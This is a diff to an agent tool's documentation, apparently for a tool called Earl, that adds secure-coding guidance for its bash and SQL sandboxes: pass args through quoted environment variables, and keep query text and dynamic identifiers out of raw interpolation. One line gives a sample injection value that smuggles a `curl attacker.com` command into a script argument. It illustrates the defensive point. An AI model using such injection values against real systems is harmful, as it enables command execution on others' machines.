@@ -106,6 +106,20 @@ bash {
 
 `max_output_bytes` truncates stdout and stderr at the specified byte count. Useful for scripts that might produce large or unbounded output.
 
+**Pass args through env vars, not directly into the script string.** Rendering a string arg directly — `script = "du -sh {{ args.path }}"` — allows a value like `. ; curl attacker.com` to inject additional shell commands. Pass the value through `env` and reference it as `"$VAR_NAME"` instead:
+
+```hcl
+bash {
+  script = "du -sh \"$EARL_PATH\""
+  env = {
+    EARL_PATH = "{{ args.path }}"
+  }
+  ...
+}
+```
+
+When a variable is expanded with double quotes, the shell treats the value as a literal string regardless of what it contains. This applies to every string param that ends up in a script.
+
 For any bash command invoked by an agent, `network = false` and explicit time/size limits are the right baseline. Expand from there only if the command's purpose requires it.
 
 ## SQL read-only sandbox
@@ -128,7 +142,9 @@ sql {
 
 `max_rows` caps how many rows are returned. Without it, an agent querying a large table with a broad predicate can return enough data to cause problems downstream. Set this to the largest result set that makes sense for the command's purpose.
 
-SQL parameters go through the driver's parameter interface, not string interpolation, so they're protected against injection. Quote each Jinja expression as a string in the `params` array — Earl coerces types before sending the query. Placeholder syntax varies by database: `$1`, `$2`... for PostgreSQL; `?` for MySQL and SQLite.
+SQL parameters go through the driver's parameter interface, not string interpolation, so they're protected against injection. This only applies to values in the `params` array. The `query` string itself is rendered by Earl's template engine before it reaches the driver — any arg interpolated directly into `query` is raw SQL, not a bound parameter. Dynamic table or column names cannot be parameterized at all; if a template makes them dynamic, restrict them to an explicit allowlist within the template rather than rendering the arg value directly.
+
+Quote each Jinja expression as a string in the `params` array — Earl coerces types before sending the query. Placeholder syntax varies by database: `$1`, `$2`... for PostgreSQL; `?` for MySQL and SQLite.
 
 ## JWT auth and policy engine for HTTP deployments
 
